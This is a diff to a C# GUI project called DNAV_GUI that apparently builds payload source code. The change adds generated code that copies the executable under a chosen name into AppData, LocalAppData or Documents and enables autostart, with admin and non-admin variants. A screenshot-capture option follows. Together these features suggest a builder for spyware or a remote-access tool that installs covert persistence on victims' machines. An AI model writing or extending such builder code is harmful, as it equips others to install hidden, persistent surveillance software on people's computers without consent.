@@ -1242,7 +1242,57 @@ namespace DNAV_GUI
 
             if (autostartCheckbox.IsChecked == true)
             {
-                code += @"";
+                if(autostartCopyCheckbox.IsChecked == true)
+                {
+                    if (needAdmin)
+                    {
+                        // Admin an anderem Ort
+                        code += @"Startup.CopyAndEnableForAdmin(""";
+                        switch (autostartCopyCombobox.SelectedIndex)
+                        {
+                            case 0:
+                                code += "Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)";
+                                break;
+                            case 1:
+                                code += "Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)";
+                                break;
+                            case 2:
+                                code += "Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)";
+                                break;
+                        }
+                        code += @""", """ + nameTextBox.Text + @".exe"");";
+                    }
+                    else
+                    {
+                        // Normal an anderem Ort
+                        code += @"Startup.CopyAndEnable(""";
+                        switch (autostartCopyCombobox.SelectedIndex)
+                        {
+                            case 0:
+                                code += "Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)";
+                                break;
+                            case 1:
+                                code += "Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)";
+                                break;
+                            case 2:
+                                code += "Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)";
+                                break;
+                        }
+                        code += @""", """ + nameTextBox.Text + @".exe"");";
+                    }
+                } else
+                {
+                    if (needAdmin)
+                    {
+                        // Admin am selben Ort
+                        code += @"Startup.EnableForAdmin();";
+                    }
+                    else
+                    {
+                        // Normal an anderem Ort
+                        code += @"Startup.Enable();";
+                    }
+                }
             }
 
             if (screenshotCheckbox.IsChecked == true)
